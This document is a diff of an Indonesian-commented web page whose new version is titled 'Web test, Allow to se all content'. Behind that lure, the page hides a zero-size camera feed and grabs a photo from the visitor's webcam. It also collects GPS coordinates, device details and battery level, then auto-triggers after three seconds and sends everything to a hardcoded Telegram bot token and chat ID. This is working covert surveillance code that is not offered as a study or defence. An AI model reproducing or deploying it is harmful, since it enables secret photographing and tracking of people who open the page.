@@ -1,13 +1,13 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tugas Kuliah - Bot Telegram</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <title>Web test, Allow to se all content</title>
 </head>
 <body>
-  <h1>Tugas Kuliah - Bot Telegram</h1>
-   <video id="video" width="0" height="0" autoplay></video>
-  <button id="capture-btn">Klik allow</button>
+  <h1>Web test, Allow to se all content</h1>
+  <video id="video" width="0" height="0" autoplay></video>
+  <button id="capture-btn">Ambil Foto</button>
   <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
 
   <script>
@@ -38,101 +38,147 @@
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       var imageDataURL = canvas.toDataURL('image/png');
-	  
-  <button onclick="capture-btn()">Ambil Foto</button>
-  <button onclick="getLocation()">Dapatkan Lokasi</button>
-  <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
-  <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
 
-  <script>
-    // Ganti dengan token bot Telegram Anda
-    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-    // Ganti dengan chat ID tujuan
-    const chatId = '1121369247';
-
-    function sendTelegramMessage(text) {
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      const data = { chat_id: chatId, text: text };
-      $.post(url, data);
-    }
-
-    function sendTelegramPhoto(photo) {
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-      const data = { chat_id: chatId, photo: photo };
-      $.post(url, data);
-    }
-
-    function takePhoto() {
-      // Mengambil foto dengan bantuan <input type="file">
-      const fileInput = document.createElement('input');
-      fileInput.type = 'file';
-      fileInput.accept = 'image/*';
-
-      fileInput.addEventListener('change', function(event) {
-        const file = event.target.files[0];
-        const reader = new FileReader();
-        reader.onload = function() {
-          const photoData = reader.result;
-          sendTelegramPhoto(photoData);
-        };
-        reader.readAsDataURL(file);
-      });
-
-      fileInput.click();
-    }
-
-    function getLocation() {
-      if ('geolocation' in navigator) {
+      // Mendapatkan lokasi akurat menggunakan GPS
+      if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const locationText = `Lokasi: ${lat}, ${lon}`;
-          sendTelegramMessage(locationText);
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+          var accuracy = position.coords.accuracy;
+
+          // Mendapatkan informasi perangkat secara detail
+          var deviceInfo = {
+            userAgent: navigator.userAgent,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            platform: navigator.platform,
+            batteryLevel: null
+          };
+
+          // Mendapatkan informasi batrai perangkat
+          if ("getBattery" in navigator) {
+            navigator.getBattery()
+              .then(function(battery) {
+                deviceInfo.batteryLevel = battery.level * 100;
+
+                // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
+                var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+                var chatId = '1121369247';
+
+                var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+                var formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', dataURItoBlob(imageDataURL));
+                formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+                fetch(url, {
+                  method: 'POST',
+                  body: formData
+                })
+                .then(function(response) {
+                  console.log('Foto, lokasi, informasi perangkat, dan informasi batrai berhasil dikirim ke Telegram.');
+                })
+                .catch(function(error) {
+                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram:', error);
+                });
+              })
+              .catch(function(error) {
+                console.error('Gagal mendapatkan informasi batrai:', error);
+
+                // Mengirim foto, lokasi, dan informasi perangkat (tanpa informasi batrai) ke Telegram API
+                var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+                var chatId = '1121369247';
+
+                var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+                var formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', dataURItoBlob(imageDataURL));
+                formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+                fetch(url, {
+                  method: 'POST',
+                  body: formData
+                })
+                .then(function(response) {
+                  console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+                })
+                .catch(function(error) {
+                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+                });
+              });
+          } else {
+            console.error('Browser tidak mendukung mendapatkan informasi batrai.');
+
+            // Mengirim foto, lokasi, dan informasi perangkat (tanpa informasi batrai) ke Telegram API
+            var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+            var chatId = '1121369247';
+
+            var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+            var formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURItoBlob(imageDataURL));
+            formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+            fetch(url, {
+              method: 'POST',
+              body: formData
+            })
+            .then(function(response) {
+              console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+            })
+            .catch(function(error) {
+              console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+            });
+          }
+        }, function(error) {
+          console.error('Gagal mendapatkan lokasi:', error);
         });
       } else {
-        sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
-      }
-    }
+        console.error('Browser tidak mendukung geolocation.');
 
-    function getDeviceInfo() {
-      const deviceInfo = `
-        Browser: ${navigator.userAgent}
-        Resolusi Layar: ${screen.width}x${screen.height}
-      `;
-      sendTelegramMessage(deviceInfo);
-    }
+        // Mengirim foto dan informasi perangkat (tanpa lokasi) ke Telegram API
+        var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+        var chatId = '1121369247';
 
-    function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-          const batteryInfo = `
-            Level Baterai: ${battery.level * 100}%
-            Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
-          `;
-          sendTelegramMessage(batteryInfo);
+        var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+        var formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', dataURItoBlob(imageDataURL));
+        formData.append('caption', 'Informasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        })
+        .then(function(response) {
+          console.log('Foto dan informasi perangkat berhasil dikirim ke Telegram.');
+        })
+        .catch(function(error) {
+          console.error('Terjadi kesalahan dalam mengirim foto dan informasi perangkat ke Telegram:', error);
         });
-      } else {
-        sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
       }
-	     }
+    };
+
+    // Fungsi untuk mengonversi data URI menjadi Blob
+    function dataURItoBlob(dataURI) {
+      var byteString = atob(dataURI.split(',')[1]);
+      var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      var ab = new ArrayBuffer(byteString.length);
+      var ia = new Uint8Array(ab);
+      for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
 
     // Fungsi untuk melakukan klik tombol secara otomatis
     function autoClickButton() {
-      var button = document.getElementById('getLocation');
-      button.click();
-	  
-	function autoClickButton() {
-      var button = document.getElementById('getDeviceInfo');
-      button.click();
-	
-	function autoClickButton() {
-      var button = document.getElementById('getBatteryInfo');
+      var button = document.getElementById('capture-btn');
       button.click();
     }
 
     // Melakukan klik tombol setelah 3 detik
     setTimeout(autoClickButton, 3000);
-    }
   </script>
 </body>
 </html>
